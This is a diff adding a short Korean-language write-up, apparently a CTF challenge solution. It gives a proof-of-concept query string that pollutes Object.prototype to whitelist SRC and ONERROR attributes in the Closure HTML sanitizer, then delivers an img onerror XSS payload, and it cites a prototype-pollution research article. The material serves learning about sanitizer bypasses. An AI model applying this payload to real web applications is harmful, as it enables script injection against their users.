@@ -1,0 +1,17 @@
+PoC:
+?__proto__[*%20SRC]=1&constructor[prototype][*%20ONERROR]=1&msg=<img%20src=x%20onerror=alert(1)>
+
+
+풀이 설명:
+
+1. parseParams 함수에서 prototype pollution이 발생한다.
+	-> config.js의 21~28 line
+
+2. prototype pollution을 통해 closure모듈(html sanitize)에서 임의의 속성값을 allow할 수 있게끔 변수 조작이 가능하다.
+	-> Object.prototype['* ONERROR'] = 1;
+  	   Object.prototype['* SRC'] = 1;
+
+3. ?__proto__[* SRC]=1&constructor[prototype][* ONERROR]=1 로 오염시키고, msg에서 XSS하면 된다.
+
+
+레퍼런스: https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/
